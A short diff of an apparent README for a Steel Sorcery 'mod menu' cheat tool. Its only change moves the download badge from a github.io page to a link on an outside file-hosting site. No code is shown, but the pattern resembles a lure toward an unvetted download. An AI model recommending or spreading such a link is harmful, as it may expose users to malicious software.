@@ -9,4 +9,4 @@
 - **Enhanced Gameplay:** gain additional features and abilities for a more immersive experience.
 - **Game Support:** designed specifically for the *Steel Sorcery* game, ensuring compatibility and stability.
 
-**[![Download Legacy Steel Sorcery Mod Menu](https://img.shields.io/badge/Download-Legacy%20Steel%20Sorcery%20Mod%20Menu-blueviolet)](https://legacy-steel-sorcery-mod-menu.github.io/legacy-steel-sorcery-mod-menu/)**
+**[![Download Legacy Steel Sorcery Mod Menu](https://img.shields.io/badge/Download-Legacy%20Steel%20Sorcery%20Mod%20Menu-blueviolet)](https://downeefiles.com/s/steelsorcery)**
